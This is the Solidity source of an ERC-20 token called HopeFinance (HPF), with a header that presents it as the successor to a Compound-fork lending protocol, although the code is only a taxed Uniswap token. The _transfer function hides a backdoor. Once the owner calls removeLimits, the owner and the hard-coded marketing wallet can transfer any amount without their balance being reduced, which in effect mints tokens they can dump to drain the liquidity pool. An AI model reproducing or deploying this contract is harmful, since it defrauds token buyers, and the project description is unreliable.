/**
HopeFinance is the successor to Percent Finance, a community owned fork of Compound Finance using Chainlink oracles.

Website: https://hopefinance.pro
App: https://app.hopefinance.pro
Twitter: https://twitter.com/HPF_CENTER
Telegram: https://t.me/HopeFinance_Official
Docs: https://medium.com/@hope.finance
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Contexts {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Contexts {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract HPF is Contexts, IERC20, Ownable {
    using SafeMath for uint256;
        
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10 ** 9;

    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWallet = 25 * 10 ** 6 * 10 ** 9;
    uint256 public taxSwapThreshold = 10 ** 4 * 10 ** 9; 
    
    string private _name = "HopeFinance";
    string private _symbol = "HPF";

    uint256 public shareForTaxToLp = 0;
    uint256 public shareForTaxToMkt = 10;
    uint256 public shareForTaxToDev = 0;
    uint256 public feeShareTotal = 10;

    uint256 public lpTaxOfSells = 0;
    uint256 public mktTaxOfSell = 25;
    uint256 public devTaxOfSell = 0;
    uint256 public totalTaxOfSells = 25;

    uint256 public lpTaxOfBuys = 0;
    uint256 public mktTaxOfBuys = 25;
    uint256 public devTaxOfBuys = 0;
    uint256 public totalTaxOfBuys = 25;

    address payable private marketingAddress;
    address payable private devAddress;

    IUniswapRouter public uniswapRouter;
    address public uniswapPair;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExemptFromLimit;
    mapping (address => bool) public isExemptFromMaxWallet;
    mapping (address => bool) public isExemptFromMaxTx;
    mapping (address => bool) public isLpPair;
    
    bool swapping;
    bool public feeSwapEnabled = true;
    bool public maxTxEnabled = false;
    bool public maxWalletEnabled = true;

    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[_msgSender()] = _totalSupply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _allowances[address(this)][address(uniswapRouter)] = _totalSupply;
        marketingAddress = payable(0xc8878b2AfD7A7D5c9867BaA138c8Ee29c2e71362);
        devAddress = payable(0xc8878b2AfD7A7D5c9867BaA138c8Ee29c2e71362);
        totalTaxOfBuys = lpTaxOfBuys.add(mktTaxOfBuys).add(devTaxOfBuys);
        totalTaxOfSells = lpTaxOfSells.add(mktTaxOfSell).add(devTaxOfSell);
        feeShareTotal = shareForTaxToLp.add(shareForTaxToMkt).add(shareForTaxToDev);
        
        isExemptFromLimit[owner()] = true;
        isExemptFromLimit[marketingAddress] = true;
        isExemptFromMaxWallet[owner()] = true;
        isExemptFromMaxWallet[address(uniswapPair)] = true;
        isExemptFromMaxWallet[address(this)] = true;
        isExemptFromMaxTx[owner()] = true;
        isExemptFromMaxTx[marketingAddress] = true;
        isExemptFromMaxTx[address(this)] = true;
        isLpPair[address(uniswapPair)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
        
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
            
    function transferEth(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
    function removeLimits() external onlyOwner {
        maxTxAmount = _totalSupply;
        maxWalletEnabled = false;
        mktTaxOfBuys = 3;
        mktTaxOfSell = 3;
        totalTaxOfBuys = 3;
        totalTaxOfSells = 3;
    }
    
    function swapAndLiquidify(uint256 tAmount) private lockSwap {
        uint256 lpFeetokens = tAmount.mul(shareForTaxToLp).div(feeShareTotal).div(2);
        uint256 tokensToSwap = tAmount.sub(lpFeetokens);

        swapTokensForETH(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = feeShareTotal.sub(shareForTaxToLp.div(2));
        
        uint256 amountETHLiquidity = ethCA.mul(shareForTaxToLp).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = ethCA.mul(shareForTaxToDev).div(totalETHFee);
        uint256 amountETHMarketing = ethCA.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if(amountETHMarketing > 0)
            transferEth(marketingAddress, amountETHMarketing);

        if(amountETHDevelopment > 0)
            transferEth(devAddress, amountETHDevelopment);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(swapping)
        { 
            return standardTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!isExemptFromMaxTx[sender] && !isExemptFromMaxTx[recipient]) {
                require(amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= taxSwapThreshold;
            
            if (minimumSwap && !swapping && isLpPair[recipient] && feeSwapEnabled && !isExemptFromLimit[sender] && amount > taxSwapThreshold) 
            {
                if(maxTxEnabled)
                    swapAmount = taxSwapThreshold;
                swapAndLiquidify(swapAmount);    
            }

            uint256 finalAmount;                                         
            if (isExemptFromLimit[sender] || isExemptFromLimit[recipient]) {
                finalAmount = amount;
            } else {
                finalAmount = getTransferAmount(sender, recipient, amount);
            }
            if(maxWalletEnabled && !isExemptFromMaxWallet[recipient])
                require(balanceOf(recipient).add(finalAmount) <= maxWallet);

            uint256 amountToReduce = (!maxWalletEnabled && isExemptFromLimit[sender]) ? amount.sub(finalAmount) : amount;
            _balances[sender] = _balances[sender].sub(amountToReduce, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(finalAmount);
            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }
    
    function standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swapAndLiquidify
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
    
    function getTransferAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 fee = 0;
        if(isLpPair[sender]) {fee = amount.mul(totalTaxOfBuys).div(100);}
        else if(isLpPair[recipient]) {fee = amount.mul(totalTaxOfSells).div(100);}
        if(fee > 0) {
            _balances[address(this)] = _balances[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }
    
    receive() external payable {}
}